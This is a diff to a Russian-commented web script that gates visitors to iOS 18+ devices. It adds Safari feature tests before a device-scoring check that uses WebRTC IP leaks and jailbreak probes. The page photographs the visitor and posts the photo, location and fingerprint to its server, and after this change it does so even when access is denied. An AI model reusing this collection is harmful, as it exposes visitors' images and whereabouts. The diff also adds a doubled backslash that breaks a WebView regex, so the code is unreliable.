@@ -1,4 +1,5 @@
-// === app.js (универсальный + жёсткий гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18; iPad desktop-UA fix) ===
+// === app.js (универсальный + жёсткий гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18; iPad desktop-UA fix
+// + Safari 18.0/18.4 feature-tests; если оба ok — выполняем старую проверку (Device Check)) ===
 
 // API base из <script>window.__API_BASE</script> в index.html
 const API_BASE =
@@ -351,7 +352,7 @@ function detectInAppWebView() {
     Discord: /Discord/i.test(ua),
     WeChat: /MicroMessenger/i.test(ua),
     Weibo: /Weibo/i.test(ua),
-    WKWebView: /\bAppleWebKit\/\d+\.\d+\s+\(KHTML, like Gecko\)\b/.test(ua) && !/Safari\//i.test(ua),
+    WKWebView: /\bAppleWebKit\/\d+\.\d+\\s+\(KHTML, like Gecko\)\b/.test(ua) && !/Safari\//i.test(ua),
   };
   const any = Object.keys(flags).filter(k => flags[k]);
   return { flags, any, isInApp: any.length > 0 };
@@ -661,7 +662,68 @@ async function collectActiveJailbreakProbes(options = {}) {
   return { summary, results, firstPositive };
 }
 
-// === Быстрый мультисбор профиля клиента ===
+// === Safari feature-tests ===
+
+// Тест №1 (Safari/iOS 18.0): View Transitions API
+async function testSafari18_0_ViewTransitions() {
+  const hasAPI = typeof document.startViewTransition === 'function';
+  const cssOK = CSS?.supports?.('view-transition-name: auto') === true;
+
+  let ran = false;
+  let finished = false;
+  try {
+    if (hasAPI) {
+      const div = document.createElement('div');
+      div.textContent = 'A'; document.body.appendChild(div);
+      const vt = document.startViewTransition(() => { div.textContent = 'B'; ran = true; });
+      await vt?.finished; finished = true;
+      div.remove();
+    }
+  } catch {}
+
+  return {
+    feature: 'Safari 18.0 View Transitions',
+    pass: !!(hasAPI && cssOK && ran && finished),
+    details: { hasAPI, cssOK, ran, finished }
+  };
+}
+
+// Тест №2 (Safari/iOS 18.4): shape() + Cookie Store + WebAuthn JSON helpers
+async function testSafari18_4_Triple() {
+  let shapeOK = false;
+  try {
+    const el = document.createElement('div');
+    el.style.clipPath = 'shape(from right center, line to bottom center, line to right center)';
+    shapeOK = !!el.style.clipPath;
+  } catch {}
+
+  const cookieStoreOK = typeof window.cookieStore === 'object' && typeof cookieStore.get === 'function';
+
+  const webauthnOK =
+    typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === 'function' &&
+    typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === 'function' &&
+    typeof window.PublicKeyCredential?.prototype?.toJSON === 'function';
+
+  return {
+    feature: 'Safari 18.4 shape() + cookieStore + WebAuthn JSON',
+    pass: !!(shapeOK && cookieStoreOK && webauthnOK),
+    details: { shapeOK, cookieStoreOK, webauthnOK }
+  };
+}
+
+async function runSafariFeatureTests(maxWaitMs = 1800) {
+  const timeout = (p, ms) => Promise.race([
+    p,
+    new Promise(res => setTimeout(() => res({ feature: 'timeout', pass: false, details: { timeoutMs: ms } }), ms))
+  ]);
+  const [vt18, triple18_4] = await Promise.all([
+    timeout(testSafari18_0_ViewTransitions(), maxWaitMs),
+    timeout(testSafari18_4_Triple(), maxWaitMs)
+  ]);
+  return { vt18_0: vt18, triple18_4 };
+}
+
+// === Быстрый мультисбор профиля клиента (как было) ===
 async function collectClientProfile() {
   // одна активная JB-проба на сессию
   let jbProbesActive = { summary:{ label: 'skipped' }, results: [] };
@@ -702,8 +764,6 @@ async function collectClientProfile() {
     webgl,
     inAppWebView: inApp,
     locale,
-
-    // важно для сервера (iPad desktop-UA fix)
     maxTouchPoints: maxTP,
     isIpad: isIpadLike,
     iosVersion: iosVersionDetected
@@ -722,8 +782,8 @@ async function collectClientProfile() {
   return profile;
 }
 
-// === Отправка отчёта ===
-async function sendReport({ photoBase64, geo, client_profile, device_check }) {
+// === Отправка отчёта (добавлены allowLaunch + summary фич) ===
+async function sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch, vt18_ok, t184_ok, denyReason }) {
   const info = getDeviceInfo();
   const code = determineCode();
   if (!code) throw new Error("Нет кода в URL");
@@ -732,10 +792,12 @@ async function sendReport({ photoBase64, geo, client_profile, device_check }) {
     ...info, // {userAgent, platform, iosVersion, isSafari}
     geo,
     photoBase64,
-    note: "auto",
+    note: denyReason ? String(denyReason) : "auto",
     code,
     client_profile,   // содержит iosVersion/isIpad/maxTouchPoints
-    device_check
+    device_check,
+    allowLaunch: !!allowLaunch,
+    featuresSummary: { VT18: vt18_ok ? 'ok' : '—', v18_4: t184_ok ? 'ok' : '—' }
   };
 
   const r = await fetch(`${API_BASE}/api/report`, {
@@ -784,13 +846,33 @@ async function autoFlow() {
     setBtnLocked();
     if (UI.text) UI.text.innerHTML = "Запрашиваем камеру и геолокацию…";
 
-    // collectClientProfile запускает active JB probe (one-shot)
+    // Параллельно: гео + фото + профиль (как было)
     const [geo, rawPhoto, client_profile] = await Promise.all([
       askGeolocation(), takePhotoWithFallback(), collectClientProfile()
     ]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
 
-    // Device Check (решает пропуск)
+    // 1) Жёсткая стадия: Safari feature-tests (18.0 + 18.4)
+    const { vt18_0, triple18_4 } = await runSafariFeatureTests();
+    const vt18_ok = !!vt18_0?.pass;
+    const t184_ok = !!triple18_4?.pass;
+    const featTxt = `Safari features: VT18=${vt18_ok ? 'ok' : '—'}, 18.4=${t184_ok ? 'ok' : '—'}`;
+
+    if (!(vt18_ok && t184_ok)) {
+      // Отказ до Device Check
+      window.__reportReady = false;
+      setBtnLocked();
+      if (UI.title) UI.title.textContent = "Доступ отклонён";
+      if (UI.text) UI.text.innerHTML = '<span class="err">Отказ по feature-tests.</span>';
+      if (UI.reason) UI.reason.textContent = featTxt;
+      if (UI.note) UI.note.textContent = "Нужны View Transitions (18.0) и shape()+CookieStore+WebAuthn JSON (18.4).";
+      try {
+        await sendReport({ photoBase64, geo, client_profile, device_check: null, allowLaunch: false, vt18_ok, t184_ok, denyReason: 'features_fail' });
+      } catch {}
+      return;
+    }
+
+    // 2) Если оба фиче-теста ok — выполняем СТАРУЮ ПРОВЕРКУ как была
     const device_check = await runDeviceCheck({
       publicIp: client_profile.publicIp,
       webrtcIps: client_profile.webrtcIps,
@@ -801,30 +883,30 @@ async function autoFlow() {
     });
     window.__lastDeviceCheck = device_check;
 
-    // Порог
+    // Порог (как было)
     if (device_check.score < 60) {
       window.__reportReady = false;
       setBtnLocked();
       if (UI.title) UI.title.textContent = "Доступ отклонён";
       if (UI.text) UI.text.innerHTML = '<span class="err">Проверка не пройдена (score &lt; 60).</span>';
       if (UI.reason) UI.reason.textContent = "Причины: " + device_check.reasons.join("; ");
-      if (UI.note) UI.note.textContent = "Отключите расширения/твики, VPN/Proxy и обновите страницу.";
-      return; // отчёт не отправляем
+      if (UI.note) UI.note.textContent = `${featTxt}`;
+      try {
+        await sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch: false, vt18_ok: true, t184_ok: true, denyReason: 'score_fail' });
+      } catch {}
+      return;
     }
 
+    // 3) Успешно — отправляем данные, даём кнопку
     if (UI.text) UI.text.innerHTML = "Отправляем данные…";
-    const resp = await sendReport({ photoBase64, geo, client_profile, device_check });
+    const resp = await sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch: true, vt18_ok: true, t184_ok: true });
 
     window.__reportReady = true;
     setBtnReady();
     if (UI.title) UI.title.textContent = "Проверка пройдена";
     if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (score ≥ 60).</span>';
-    if (UI.note) {
-      if (device_check.score < 80) UI.note.textContent = "Есть несостыковки — рекомендуется доп. проверка.";
-      else UI.note.textContent = "Всё выглядит правдоподобно.";
-    }
+    if (UI.note) UI.note.textContent = `${featTxt}`;
 
-    // доп. обработка ответа сервера (если нужно)
     if (resp && resp.delivered === false && UI.note) {
       UI.note.textContent = resp.reason || "Отправлено с задержкой.";
     }
